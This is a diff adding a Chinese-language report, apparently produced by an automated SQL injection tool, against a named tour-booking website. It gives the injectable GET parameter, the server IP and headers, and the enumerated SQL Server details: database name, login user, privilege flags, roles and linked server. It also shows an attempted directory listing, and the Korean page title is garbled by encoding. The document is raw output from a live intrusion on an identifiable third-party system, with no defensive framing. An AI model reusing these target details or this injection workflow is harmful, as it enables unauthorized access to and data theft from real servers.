@@ -1,0 +1,92 @@
+■漏洞信息:============================================================
+ ·URL:http://www.iebtour.com/item/item_view.asp?page=9&item_id=18118
+ ·页面标题：
+扼胶海啊胶 荤柳 康惑扁磊犁 冠恩雀(*PMA 2009*固林 弥措痹葛)
+
+
+ ·参数:page=9&item_id=18118
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:203.248.195.41
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Mon, 04 Apr 2011 07:25:05 GMT
+Connection: Keep-Alive
+Content-Length: 25707
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQCARBQBT=GOJOAPNBIFHNHHDFOODFOLKH; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：IEBTOURDB
+- 用户名：IEBAPP
+- 版本：Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+	Feb  9 2007 22:47:07 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 6.0 (Build 6002: Service Pack 2)
+
+- 服务器名：WIN-GDJQI45DYJH
+- 服务名：MSSQLSERVER
+- 系统用户名：IEBAPP
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master		
+tempdb		
+model		
+msdb		
+IEBTOURDB		
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Microsoft(R) Windows (R) 2000 Operating System	runnable	JJANGA13	1496	SELECT		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WIN-GDJQI45DYJH	SQL Server	SQLOLEDB	WIN-GDJQI45DYJH		WIN-GDJQI45DYJH	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
